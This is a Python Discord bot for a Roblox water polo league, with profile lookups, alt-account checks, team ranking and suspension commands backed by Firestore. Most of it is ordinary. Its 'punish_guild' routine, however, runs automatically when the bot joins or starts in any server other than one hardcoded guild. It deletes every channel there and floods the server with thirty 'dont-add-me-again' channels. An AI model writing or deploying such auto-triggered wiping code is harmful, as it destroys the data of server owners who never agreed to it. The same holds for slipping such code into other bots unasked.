"""
RWA Discord Bot
Teams: Chicago Water | LA Galaxy WC | VK Jug Dubrovnik
"""

import os
import asyncio
import logging
import aiohttp
from datetime import datetime, timezone
from dotenv import load_dotenv

import discord
from discord import option

import firebase_admin
from firebase_admin import credentials, firestore

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
ALLOWED_ADMIN_IDS = [1340332911668498473, 687733937367547929]
OWNER_ID          = 1340332911668498473
HOME_GUILD_ID     = 1464684512217661512

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("rwa-bot")

DISCORD_TOKEN  = os.getenv("TOKEN")
LOG_CHANNEL    = os.getenv("LOG_CHANNEL_NAME", "mod-logs")
FIREBASE_CREDS = os.getenv("FIREBASE_CREDENTIALS", "firebase.json")

GUILD = [HOME_GUILD_ID]

# ─────────────────────────────────────────────
# TEAMS
# ─────────────────────────────────────────────
TEAMS = {
    "Chicago Water":    {"key": "chicago_water"},
    "LA Galaxy WC":     {"key": "la_galaxy_wc"},
    "VK Jug Dubrovnik": {"key": "vk_jug_dubrovnik"},
    "CD Guadalajara": {"key": "cdguadalajara"},
    "Blackburn and Darwen": {"key": "BlackburnandDarwen"},
    "Lodz STW": {"key": "LodzSTW"},
    "Neptuns": {"key": "Neptuns"},
    "Free Agent":       {"key": "free_agent"},
}
TEAM_CHOICES = ["Chicago Water", "LA Galaxy WC", "VK Jug Dubrovnik", "CD Guadalajara", "Blackburn and Darwen", "Lodz STW", "Neptuns"]

def ts() -> str:
    return datetime.now(timezone.utc).isoformat()

# ─────────────────────────────────────────────
# FIREBASE
# ─────────────────────────────────────────────
def init_firebase() -> firestore.Client:
    import tempfile

    raw = os.getenv("FIREBASE_JSON")
    if raw:
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".json", mode="w")
        tmp.write(raw)
        tmp.close()
        cred_path = tmp.name
    elif os.path.exists(FIREBASE_CREDS):
        cred_path = FIREBASE_CREDS
    else:
        raise FileNotFoundError("No Firebase credentials found.")

    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred)
    log.info("Firebase initialised")
    return firestore.client()

db: firestore.Client = init_firebase()

def fb_get_user(roblox_id: int) -> dict | None:
    doc = db.collection("users").document(str(roblox_id)).get()
    return doc.to_dict() if doc.exists else None

def fb_upsert_user(roblox_id: int, data: dict):
    db.collection("users").document(str(roblox_id)).set(data, merge=True)

# ─────────────────────────────────────────────
# ROBLOX API
# ─────────────────────────────────────────────
ROBLOX_USERS_URL   = "https://users.roblox.com/v1"
ROBLOX_THUMBS_URL  = "https://thumbnails.roblox.com/v1"
ROBLOX_FRIENDS_URL = "https://friends.roblox.com/v1"
ROBLOX_BADGES_URL  = "https://badges.roblox.com/v1"
ROBLOX_GROUPS_URL  = "https://groups.roblox.com/v1"

async def roblox_get(session: aiohttp.ClientSession, url: str) -> dict | list | None:
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status == 200:
                return await r.json()
            log.warning("Roblox API %s -> HTTP %s", url, r.status)
    except Exception as e:
        log.error("Roblox GET error: %s", e)
    return None

async def get_roblox_id(session: aiohttp.ClientSession, username: str) -> int | None:
    try:
        async with session.post(
            f"{ROBLOX_USERS_URL}/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": False},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            if r.status == 200:
                data = await r.json()
                users = data.get("data", [])
                return users[0]["id"] if users else None
    except Exception as e:
        log.error("get_roblox_id error: %s", e)
    return None

async def get_roblox_profile(session: aiohttp.ClientSession, username: str) -> dict | None:
    uid = await get_roblox_id(session, username)
    if not uid:
        return None
    user_data = await roblox_get(session, f"{ROBLOX_USERS_URL}/users/{uid}")
    if not user_data:
        return None
    thumb_data = await roblox_get(
        session,
        f"{ROBLOX_THUMBS_URL}/users/avatar-headshot?userIds={uid}&size=420x420&format=Png&isCircular=false",
    )
    avatar_url = None
    if thumb_data and thumb_data.get("data"):
        avatar_url = thumb_data["data"][0].get("imageUrl")
    return {
        "id":          uid,
        "username":    user_data.get("name"),
        "display":     user_data.get("displayName"),
        "description": user_data.get("description", ""),
        "created":     user_data.get("created", ""),
        "banned":      user_data.get("isBanned", False),
        "avatar_url":  avatar_url,
    }

async def get_roblox_badges(session: aiohttp.ClientSession, uid: int) -> list:
    data = await roblox_get(session, f"{ROBLOX_BADGES_URL}/users/{uid}/badges?limit=10")
    return data.get("data", []) if data else []

async def get_roblox_friends(session: aiohttp.ClientSession, uid: int) -> list:
    data = await roblox_get(session, f"{ROBLOX_FRIENDS_URL}/users/{uid}/friends")
    return data.get("data", []) if data else []

async def get_roblox_groups(session: aiohttp.ClientSession, uid: int) -> list:
    data = await roblox_get(session, f"{ROBLOX_GROUPS_URL}/users/{uid}/groups/roles")
    return data.get("data", []) if data else []

async def run_alt_check(profile: dict) -> list[str]:
    async with aiohttp.ClientSession() as session:
        badges  = await get_roblox_badges(session, profile["id"])
        friends = await get_roblox_friends(session, profile["id"])
        groups  = await get_roblox_groups(session, profile["id"])

    flags: list[str] = []
    created = profile.get("created", "")
    if created:
        age_days = (
            datetime.now(timezone.utc)
            - datetime.fromisoformat(created.replace("Z", "+00:00"))
        ).days
        if age_days < 30:
            flags.append(f"Account created {age_days} day(s) ago")
    if len(badges) < 3:
        flags.append(f"Only {len(badges)} badge(s)")
    if len(friends) < 5:
        flags.append(f"Only {len(friends)} friend(s)")
    if not groups:
        flags.append("No group memberships")
    if profile.get("banned"):
        flags.append("Account is banned on Roblox")
    return flags

# ─────────────────────────────────────────────
# BOT
# ─────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = discord.Bot(intents=intents)

async def send_log(guild: discord.Guild, embed: discord.Embed):
    ch = discord.utils.get(guild.text_channels, name=LOG_CHANNEL)
    if ch:
        try:
            await ch.send(embed=embed)
        except discord.Forbidden:
            pass

# ─────────────────────────────────────────────
# WRONG SERVER PUNISHMENT
# ─────────────────────────────────────────────
async def punish_guild(guild: discord.Guild):
    log.warning("Unauthorized guild %s (%s) - punishing", guild.name, guild.id)
    try:
        for channel in list(guild.channels):
            try:
                await channel.delete(reason="Unauthorized server")
            except Exception:
                pass
        for i in range(1, 31):
            try:
                await guild.create_text_channel(f"dont-add-me-again-{i}")
            except Exception:
                pass
    except Exception as e:
        log.error("Punish guild error: %s", e)

# ─────────────────────────────────────────────
# ALT CONFIRM VIEW
# ─────────────────────────────────────────────
class AltConfirmView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=30)
        self.choice = None

    @discord.ui.button(label="Yes, rank anyway", style=discord.ButtonStyle.danger)
    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.choice = True
        self.stop()
        await interaction.response.defer()

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
        self.choice = False
        self.stop()
        await interaction.response.defer()

# ─────────────────────────────────────────────
# COMMANDS
# ─────────────────────────────────────────────

@bot.slash_command(name="profile", description="Look up a Roblox user's profile.", guild_ids=GUILD)
@option("roblox_user", description="Roblox username")
async def cmd_profile(ctx: discord.ApplicationContext, roblox_user: str):
    await ctx.defer()
    async with aiohttp.ClientSession() as session:
        profile = await get_roblox_profile(session, roblox_user)

    if not profile:
        await ctx.followup.send(f"Couldn't find Roblox user **{roblox_user}**.", ephemeral=True)
        return

    record    = fb_get_user(profile["id"])
    team      = record.get("team", "Free Agent") if record else "Free Agent"
    suspended = record.get("suspended", False) if record else False
    joined    = profile["created"][:10] if profile["created"] else "Unknown"

    title = profile["username"]
    if profile["display"] and profile["display"] != profile["username"]:
        title += f" ({profile['display']})"

    embed = discord.Embed(
        title=title,
        url=f"https://www.roblox.com/users/{profile['id']}/profile",
        color=discord.Color.blurple(),
    )
    embed.set_thumbnail(url=profile["avatar_url"] or "")
    embed.add_field(name="Roblox ID", value=str(profile["id"]), inline=True)
    embed.add_field(name="Joined",    value=joined,              inline=True)
    embed.add_field(name="Team",      value=team,                inline=True)

    status_parts = []
    if profile["banned"]:
        status_parts.append("Banned on Roblox")
    if suspended:
        status_parts.append("Suspended")
    if status_parts:
        embed.add_field(name="Status", value=" | ".join(status_parts), inline=False)
    if profile["description"]:
        embed.add_field(name="Bio", value=profile["description"][:200], inline=False)

    embed.set_footer(text=f"Requested by {ctx.author}")
    await ctx.followup.send(embed=embed)


@bot.slash_command(name="altcheck", description="Run an alt-account check on a Roblox user.", guild_ids=GUILD)
@option("roblox_user", description="Roblox username")
async def cmd_altcheck(ctx: discord.ApplicationContext, roblox_user: str):
    await ctx.defer()
    async with aiohttp.ClientSession() as session:
        profile = await get_roblox_profile(session, roblox_user)
        if not profile:
            await ctx.followup.send(f"Couldn't find Roblox user **{roblox_user}**.", ephemeral=True)
            return
        badges  = await get_roblox_badges(session, profile["id"])
        friends = await get_roblox_friends(session, profile["id"])
        groups  = await get_roblox_groups(session, profile["id"])

    flags: list[str] = []
    created = profile.get("created", "")
    if created:
        age_days = (
            datetime.now(timezone.utc)
            - datetime.fromisoformat(created.replace("Z", "+00:00"))
        ).days
        if age_days < 30:
            flags.append(f"Account created {age_days} day(s) ago")
    if len(badges) < 3:
        flags.append(f"Only {len(badges)} badge(s)")
    if len(friends) < 5:
        flags.append(f"Only {len(friends)} friend(s)")
    if not groups:
        flags.append("No group memberships")
    if profile.get("banned"):
        flags.append("Account is banned on Roblox")

    risk  = "HIGH RISK" if len(flags) >= 3 else ("MEDIUM" if flags else "CLEAN")
    color = (
        discord.Color.red()    if risk == "HIGH RISK" else
        discord.Color.yellow() if risk == "MEDIUM"    else
        discord.Color.green()
    )

    embed = discord.Embed(title=f"Alt Check: {profile['username']}", color=color)
    embed.set_thumbnail(url=profile["avatar_url"] or "")
    embed.add_field(name="Risk",    value=risk,              inline=True)
    embed.add_field(name="Badges",  value=str(len(badges)),  inline=True)
    embed.add_field(name="Friends", value=str(len(friends)), inline=True)
    embed.add_field(name="Groups",  value=str(len(groups)),  inline=True)

    if flags:
        embed.add_field(name="Flags", value="\n".join(f"- {f}" for f in flags), inline=False)
    else:
        embed.add_field(name="Result", value="No flags. Account looks legitimate.", inline=False)

    if groups:
        embed.add_field(
            name="Group List",
            value=", ".join(g["group"]["name"] for g in groups[:5]),
            inline=False,
        )

    embed.set_footer(text=f"Checked by {ctx.author}")
    await ctx.followup.send(embed=embed)


@bot.slash_command(name="badges", description="List Roblox badges for a user.", guild_ids=GUILD)
@option("roblox_user", description="Roblox username")
async def cmd_badges(ctx: discord.ApplicationContext, roblox_user: str):
    await ctx.defer()
    async with aiohttp.ClientSession() as session:
        uid = await get_roblox_id(session, roblox_user)
        if not uid:
            await ctx.followup.send(f"Couldn't find user **{roblox_user}**.", ephemeral=True)
            return
        badges = await get_roblox_badges(session, uid)

    embed = discord.Embed(
        title=f"Badges: {roblox_user}",
        description=f"{len(badges)} badge(s) (showing up to 10)",
        color=discord.Color.blurple(),
    )
    for b in badges[:10]:
        embed.add_field(
            name=b.get("name", "Unknown"),
            value=b.get("description", "")[:80] or "No description",
            inline=True,
        )
    await ctx.followup.send(embed=embed)


@bot.slash_command(name="friends", description="List Roblox friends for a user.", guild_ids=GUILD)
@option("roblox_user", description="Roblox username")
async def cmd_friends(ctx: discord.ApplicationContext, roblox_user: str):
    await ctx.defer()
    async with aiohttp.ClientSession() as session:
        uid = await get_roblox_id(session, roblox_user)
        if not uid:
            await ctx.followup.send(f"Couldn't find user **{roblox_user}**.", ephemeral=True)
            return
        friends = await get_roblox_friends(session, uid)

    embed = discord.Embed(
        title=f"Friends: {roblox_user}",
        description=f"{len(friends)} friend(s) total",
        color=discord.Color.blurple(),
    )
    if len(friends) > 200:
        embed.add_field(name="Note", value="Very high friend count. Possible bot account.", inline=False)
    lines = "\n".join(f["name"] for f in friends[:20])
    embed.add_field(name="List (up to 20)", value=lines or "None", inline=False)
    await ctx.followup.send(embed=embed)


team_group = bot.create_group("team", "Team commands", guild_ids=GUILD)

@team_group.command(name="view", description="View players on a team.")
@option("team_name", description="Team name", choices=TEAM_CHOICES)
async def cmd_team_view(ctx: discord.ApplicationContext, team_name: str):
    await ctx.defer()
    query   = db.collection("users").where("team", "==", team_name).stream()
    members = [d.to_dict() for d in query]

    embed = discord.Embed(
        title=team_name,
        description=f"{len(members)} player(s)",
        color=discord.Color.green(),
    )
    if members:
        lines = "\n".join(m["roblox_username"] for m in members[:30])
        embed.add_field(name="Players", value=lines, inline=False)
    else:
        embed.description = "No players on this team yet."

    embed.set_footer(text=f"Requested by {ctx.author}")
    await ctx.followup.send(embed=embed)


@bot.slash_command(name="rank", description="Assign a player to a team. (Admin only)", guild_ids=GUILD)
@option("roblox_name", description="Roblox username")
@option("team_name",   description="Team to assign", choices=TEAM_CHOICES)
async def cmd_rank(ctx: discord.ApplicationContext, roblox_name: str, team_name: str):
    await ctx.defer(ephemeral=True)
    if ctx.author.id not in ALLOWED_ADMIN_IDS:
        await ctx.followup.send("You don't have permission to do that.", ephemeral=True)
        return

    async with aiohttp.ClientSession() as session:
        profile = await get_roblox_profile(session, roblox_name)

    if not profile:
        await ctx.followup.send(f"Couldn't find Roblox user **{roblox_name}**.", ephemeral=True)
        return

    flags = await run_alt_check(profile)

    if flags:
        risk      = "HIGH RISK" if len(flags) >= 3 else "MEDIUM"
        flag_text = "\n".join(f"- {f}" for f in flags)
        warn_embed = discord.Embed(
            title=f"Alt Flag Warning: {profile['username']}",
            description=(
                f"This user is flagged as a potential alt account by our detection systems.\n\n"
                f"**Risk: {risk}**\n\n{flag_text}\n\nDo you still want to rank them?"
            ),
            color=discord.Color.yellow(),
        )
        warn_embed.set_thumbnail(url=profile["avatar_url"] or "")

        view = AltConfirmView()
        msg  = await ctx.followup.send(embed=warn_embed, view=view, ephemeral=True)
        await view.wait()

        if not view.choice:
            await ctx.followup.send("Ranking cancelled.", ephemeral=True)
            return

    fb_upsert_user(profile["id"], {
        "roblox_id":             profile["id"],
        "roblox_username":       profile["username"],
        "roblox_username_lower": profile["username"].lower(),
        "team":                  team_name,
    })

    embed = discord.Embed(title="Player Assigned", color=discord.Color.green())
    embed.set_thumbnail(url=profile["avatar_url"] or "")
    embed.add_field(name="Player", value=profile["username"], inline=True)
    embed.add_field(name="Team",   value=team_name,           inline=True)
    embed.add_field(name="By",     value=str(ctx.author),     inline=True)
    if flags:
        embed.add_field(name="Note", value="Ranked despite alt flags.", inline=False)
    embed.set_footer(text=ts()[:10])

    await ctx.followup.send(embed=embed, ephemeral=True)
    await send_log(ctx.guild, embed)


@bot.slash_command(name="unrank", description="Move a player back to Free Agent. (Admin only)", guild_ids=GUILD)
@option("roblox_name", description="Roblox username")
async def cmd_unrank(ctx: discord.ApplicationContext, roblox_name: str):
    await ctx.defer(ephemeral=True)
    if ctx.author.id not in ALLOWED_ADMIN_IDS:
        await ctx.followup.send("You don't have permission to do that.", ephemeral=True)
        return

    async with aiohttp.ClientSession() as session:
        profile = await get_roblox_profile(session, roblox_name)

    if not profile:
        await ctx.followup.send(f"Couldn't find Roblox user **{roblox_name}**.", ephemeral=True)
        return

    record    = fb_get_user(profile["id"])
    prev_team = record.get("team", "Unknown") if record else "Unknown"

    fb_upsert_user(profile["id"], {
        "roblox_id":             profile["id"],
        "roblox_username":       profile["username"],
        "roblox_username_lower": profile["username"].lower(),
        "team":                  "Free Agent",
    })

    embed = discord.Embed(title="Player Unranked", color=discord.Color.orange())
    embed.set_thumbnail(url=profile["avatar_url"] or "")
    embed.add_field(name="Player",        value=profile["username"], inline=True)
    embed.add_field(name="Previous Team", value=prev_team,           inline=True)
    embed.add_field(name="By",            value=str(ctx.author),     inline=True)
    embed.set_footer(text=ts()[:10])

    await ctx.followup.send(embed=embed, ephemeral=True)
    await send_log(ctx.guild, embed)


@bot.slash_command(name="suspend", description="Suspend a player. (Admin only)", guild_ids=GUILD)
@option("roblox_name", description="Roblox username")
@option("reason",      description="Reason for suspension", required=False)
async def cmd_suspend(ctx: discord.ApplicationContext, roblox_name: str, reason: str = "No reason provided"):
    await ctx.defer(ephemeral=True)
    if ctx.author.id not in ALLOWED_ADMIN_IDS:
        await ctx.followup.send("You don't have permission to do that.", ephemeral=True)
        return

    async with aiohttp.ClientSession() as session:
        profile = await get_roblox_profile(session, roblox_name)

    if not profile:
        await ctx.followup.send(f"Couldn't find Roblox user **{roblox_name}**.", ephemeral=True)
        return

    record = fb_get_user(profile["id"])
    if record and record.get("suspended"):
        await ctx.followup.send(f"**{roblox_name}** is already suspended.", ephemeral=True)
        return

    fb_upsert_user(profile["id"], {
        "roblox_id":             profile["id"],
        "roblox_username":       profile["username"],
        "roblox_username_lower": profile["username"].lower(),
        "suspended":             True,
        "suspended_reason":      reason,
    })

    embed = discord.Embed(title="Player Suspended", color=discord.Color.red())
    embed.set_thumbnail(url=profile["avatar_url"] or "")
    embed.add_field(name="Player", value=profile["username"], inline=True)
    embed.add_field(name="By",     value=str(ctx.author),     inline=True)
    embed.add_field(name="Reason", value=reason,              inline=False)
    embed.set_footer(text=ts()[:10])

    await ctx.followup.send(embed=embed, ephemeral=True)
    await send_log(ctx.guild, embed)


@bot.slash_command(name="unsuspend", description="Lift a player's suspension. (Admin only)", guild_ids=GUILD)
@option("roblox_name", description="Roblox username")
async def cmd_unsuspend(ctx: discord.ApplicationContext, roblox_name: str):
    await ctx.defer(ephemeral=True)
    if ctx.author.id not in ALLOWED_ADMIN_IDS:
        await ctx.followup.send("You don't have permission to do that.", ephemeral=True)
        return

    async with aiohttp.ClientSession() as session:
        profile = await get_roblox_profile(session, roblox_name)

    if not profile:
        await ctx.followup.send(f"Couldn't find Roblox user **{roblox_name}**.", ephemeral=True)
        return

    record = fb_get_user(profile["id"])
    if record and not record.get("suspended"):
        await ctx.followup.send(f"**{roblox_name}** is not currently suspended.", ephemeral=True)
        return

    fb_upsert_user(profile["id"], {
        "roblox_id":             profile["id"],
        "roblox_username":       profile["username"],
        "roblox_username_lower": profile["username"].lower(),
        "suspended":             False,
        "suspended_reason":      "",
    })

    embed = discord.Embed(title="Suspension Lifted", color=discord.Color.green())
    embed.set_thumbnail(url=profile["avatar_url"] or "")
    embed.add_field(name="Player", value=profile["username"], inline=True)
    embed.add_field(name="By",     value=str(ctx.author),     inline=True)
    embed.set_footer(text=ts()[:10])

    await ctx.followup.send(embed=embed, ephemeral=True)
    await send_log(ctx.guild, embed)


@bot.slash_command(name="reset", description="Owner only: restore server after punishment.", guild_ids=GUILD)
async def cmd_reset(ctx: discord.ApplicationContext):
    await ctx.defer(ephemeral=True)
    if ctx.author.id != OWNER_ID:
        await ctx.followup.send("No.", ephemeral=True)
        return

    guild = ctx.guild
    for ch in list(guild.channels):
        try:
            await ch.delete()
        except Exception:
            pass

    try:
        await guild.create_text_channel("general")
        await guild.create_text_channel("mod-logs")
        await guild.create_text_channel("bot-commands")
        await guild.create_voice_channel("General")
    except Exception as e:
        log.error("Reset channel creation error: %s", e)

    await ctx.followup.send("Server restored.", ephemeral=True)

# ─────────────────────────────────────────────
# EVENTS
# ─────────────────────────────────────────────
@bot.event
async def on_ready():
    log.info("Logged in as %s (ID: %s)", bot.user, bot.user.id)
    log.info("Connected to %d guild(s)", len(bot.guilds))

    await bot.sync_commands(guild_ids=GUILD)
    log.info("Slash commands synced to guild %s", HOME_GUILD_ID)

    for guild in bot.guilds:
        if guild.id != HOME_GUILD_ID:
            await punish_guild(guild)

    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name="RWA")
    )


@bot.event
async def on_guild_join(guild: discord.Guild):
    if guild.id != HOME_GUILD_ID:
        await punish_guild(guild)


@bot.event
async def on_application_command_error(ctx: discord.ApplicationContext, error: discord.DiscordException):
    log.error("Command error in /%s: %s", ctx.command, error)
    msg = (
        "You don't have permission to run this command."
        if isinstance(error, discord.errors.CheckFailure)
        else str(error)
    )
    try:
        await ctx.followup.send(f"Error: {msg[:200]}", ephemeral=True)
    except Exception:
        pass

# ─────────────────────────────────────────────
# KEEPALIVE
# ─────────────────────────────────────────────
async def keepalive():
    from aiohttp import web

    async def health(_request):
        return web.Response(text="OK")

    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)

    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", 7860).start()
    log.info("Keepalive running on :7860")

# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────
async def main():
    await keepalive()
    if not DISCORD_TOKEN:
        raise ValueError("DISCORD_TOKEN is not set.")
    await bot.start(DISCORD_TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
